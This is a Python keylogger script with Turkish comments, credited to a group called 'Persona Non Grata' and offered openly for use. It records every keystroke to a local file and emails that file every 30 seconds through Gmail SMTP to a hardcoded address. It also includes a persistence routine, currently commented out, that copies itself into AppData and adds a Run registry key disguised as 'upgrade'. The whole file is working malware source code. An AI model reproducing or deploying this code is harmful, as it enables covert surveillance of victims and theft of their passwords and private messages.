# @ykslkrkci tarafından Persona Non Grata için yazılmıştır. Doğuracağı sonuçlardan sorumluluk bana ait değildir.

#Mailleri atmak için kullanacağınız hesabınızda giriş yaparak, "https://myaccount.google.com/lesssecureapps"
#Daha az güvenli uygulama erişimini açmalısınız.

################################################
from pynput.keyboard import Key,Listener       #
import os                                      #
import sys                                     #
import shutil                                  #
import subprocess                              #
import smtplib                                 #
from datetime import datetime                  #
from email.mime.text import MIMEText           #
from email.mime.multipart import MIMEMultipart #
from email.mime.base import MIMEBase           #
from email import encoders                     #
import threading                               #
################################################
say = 0
keys = []
def ekle():
  dosya = os.environ["appdata"] + "\\keylogger.exe"  #Birazdan Kopyalıyacağım dosyanın yolunu hazırlıyorum.
  if not os.path.exists(dosya):
    shutil.copyfile(sys.executable,dosya)      #Yeni Dosyamı Appdata nın içine kopyaladım.
    regedit_ekle = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + dosya
    subprocess.call(regedit_ekle, shell=True)    #Her bilgisayar açıldığında çalışmasını umuyorum :D
#ekle()

def Basildi(key):
    global say,keys
    say += 1
    keys.append(key)
    if say >= 10:
        say = 0
        write_file(keys)
        keys = []
def write_file(keys):
    with open("vurus.txt" , "a" , encoding="utf-8") as file:
        for key in keys:

            k = str(key).replace("'", "")
            if k.find("space") > 0:
                file.write("\n")
            elif k.find("Key") == -1:
                file.write(k)
def SalBizi(key):
    pass
def Arkaplan():
    Gonder()
    zamanlayici = threading.Timer(30,Arkaplan)
    zamanlayici.start()
def Gonder():
    email_user = 'mail@mail.mail'
    email_password = 'mail.sifre'
    email_send = 'mail@mail.mail'

    subject = 'Persona Non Grata'

    msg = MIMEMultipart()
    msg['From'] = email_user
    msg['To'] = email_send
    msg['Subject'] = subject

    body = str(datetime.now())
    msg.attach(MIMEText(body,'plain'))

    filename='vurus.txt'
    attachment  = open(filename,'r')

    part = MIMEBase('application','octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition',"attachment; filename= "+filename)

    msg.attach(part)
    text = msg.as_string()
    server = smtplib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(email_user,email_password)

    server.sendmail(email_user,email_send,text)
    server.quit()
with Listener(on_press = Basildi, on_release = SalBizi) as listener:
    Arkaplan()
    listener.join()
